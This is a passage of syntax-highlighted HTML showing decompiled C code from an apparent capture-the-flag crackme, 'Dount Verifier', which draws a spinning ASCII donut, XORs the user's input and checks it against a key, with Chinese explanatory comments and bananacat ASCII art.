&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v46 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v42 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(user_input, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1024&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Dount Verifier&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Input: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%1023s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, user_input);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x1B&lt;/span>&lt;span style="color:#e6db74">[2J&amp;#34;&lt;/span>); &lt;span style="color:#f92672">//&lt;/span> 這個意思是清除整個頁面
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">499&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(s, &lt;span style="color:#ae81ff">32&lt;/span>, sizeof(s));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(v20, &lt;span style="color:#ae81ff">0&lt;/span>, sizeof(v20));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6.28&lt;/span>; j &lt;span style="color:#f92672">=&lt;/span> v14 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v40 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( k &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>; k &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6.28&lt;/span>; k &lt;span style="color:#f92672">=&lt;/span> v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(k));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v3&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v3&lt;span style="color:#f92672">.&lt;/span>m128i_i64);&lt;span style="color:#f92672">//&lt;/span> 計算浮點數的正弦值&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>參考自https:&lt;span style="color:#f92672">//&lt;/span>learn&lt;span style="color:#f92672">.&lt;/span>microsoft&lt;span style="color:#f92672">.&lt;/span>com&lt;span style="color:#f92672">/&lt;/span>zh&lt;span style="color:#f92672">-&lt;/span>tw&lt;span style="color:#f92672">/&lt;/span>cpp&lt;span style="color:#f92672">/&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>runtime&lt;span style="color:#f92672">-&lt;/span>library&lt;span style="color:#f92672">/&lt;/span>reference&lt;span style="color:#f92672">/&lt;/span>sin&lt;span style="color:#f92672">-&lt;/span>sinf&lt;span style="color:#f92672">-&lt;/span>sinl&lt;span style="color:#960050;background-color:#1e0010">?&lt;/span>view&lt;span style="color:#f92672">=&lt;/span>msvc&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">170&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v3));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(j));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v4&lt;span style="color:#f92672">.&lt;/span>m128i_i64);&lt;span style="color:#f92672">//&lt;/span> 計算餘弦值&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>參考自https:&lt;span style="color:#f92672">//&lt;/span>learn&lt;span style="color:#f92672">.&lt;/span>microsoft&lt;span style="color:#f92672">.&lt;/span>com&lt;span style="color:#f92672">/&lt;/span>zh&lt;span style="color:#f92672">-&lt;/span>tw&lt;span style="color:#f92672">/&lt;/span>cpp&lt;span style="color:#f92672">/&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>runtime&lt;span style="color:#f92672">-&lt;/span>library&lt;span style="color:#f92672">/&lt;/span>reference&lt;span style="color:#f92672">/&lt;/span>cos&lt;span style="color:#f92672">-&lt;/span>cosf&lt;span style="color:#f92672">-&lt;/span>cosl&lt;span style="color:#960050;background-color:#1e0010">?&lt;/span>view&lt;span style="color:#f92672">=&lt;/span>msvc&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">170&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v4));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v47));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v5&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v5&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v5));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(j));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v6&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v6&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v6));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v47));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v7&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v7&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v7));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> v36 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.0&lt;/span> &lt;span style="color:#f92672">/&lt;/span> ((((v37 &lt;span style="color:#f92672">*&lt;/span> (v36 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2.0&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> v35) &lt;span style="color:#f92672">+&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">5.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(k));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v8&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v8&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v8));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v46));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v9&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v9&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v9));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v46));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v10&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v10&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v10));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v33) &lt;span style="color:#f92672">-&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v35);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> (((v31 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">30.0&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (((v30 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">-&lt;/span> (v27 &lt;span style="color:#f92672">*&lt;/span> v28))) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">40.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> (((v31 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">15.0&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> ((v27 &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">+&lt;/span> ((v30 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v28))) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v25 &lt;span style="color:#f92672">+&lt;/span> v26;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">8.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span> ((((((v34 &lt;span style="color:#f92672">*&lt;/span> v35) &lt;span style="color:#f92672">-&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">-&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v35)) &lt;span style="color:#f92672">-&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">-&lt;/span> ((v30 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v28)));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v25 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v25 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v26 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v26 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">79&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v31 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v20[v24] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20[v24] &lt;span style="color:#f92672">=&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v23;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v23 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s[v24] &lt;span style="color:#f92672">=&lt;/span> special_char[v11]; &lt;span style="color:#f92672">//&lt;/span> special_char就是印出甜甜圈的素材
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v40 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v42 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0x3FF&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> v24 &lt;span style="color:#f92672">^&lt;/span> v23 &lt;span style="color:#f92672">^&lt;/span> (v26 &lt;span style="color:#f92672">+&lt;/span> v25);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> v42&lt;span style="color:#f92672">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(user_input &lt;span style="color:#f92672">+&lt;/span> v12) &lt;span style="color:#f92672">^=&lt;/span> v24 &lt;span style="color:#f92672">^&lt;/span> v23 &lt;span style="color:#f92672">^&lt;/span> (v26 &lt;span style="color:#f92672">+&lt;/span> v25);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v40;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> k &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.02&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.07000000000000001&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x1B&lt;/span>&lt;span style="color:#e6db74">[H&amp;#34;&lt;/span>); &lt;span style="color:#f92672">//&lt;/span> 這個代表游標回到home position
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( idx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; idx &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0x6E0&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>idx ) &lt;span style="color:#f92672">//&lt;/span> 這一段for loop就是在印出甜甜圈
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( idx &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> s[idx];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> putchar(v15);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> v47 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.00004&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> v16;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> v46 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.00002&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v46 &lt;span style="color:#f92672">=&lt;/span> v17;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usleep(&lt;span style="color:#ae81ff">30000&lt;/span>u); &lt;span style="color:#f92672">//&lt;/span> 睡眠0&lt;span style="color:#ae81ff">.03&lt;/span>秒
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher_1 &lt;span style="color:#f92672">=&lt;/span> verification(user_input, &lt;span style="color:#ae81ff">0x400&lt;/span>uLL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher_2 &lt;span style="color:#f92672">=&lt;/span> verification(key, &lt;span style="color:#ae81ff">0x400&lt;/span>uLL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( cipher_1 &lt;span style="color:#f92672">==&lt;/span> cipher_2 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Donut likes your input!! :D&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Donut Reject You!! :(&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;No matter donut accept you or not. Here&amp;#39;s a bananacat for you&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(icon);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">112&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">232&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">352&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">480&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">600&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">728&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">856&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">992&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">1128&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">1272&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▓▒▒▒▒▒░░░░░░░░░░▒▒▒▓▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span 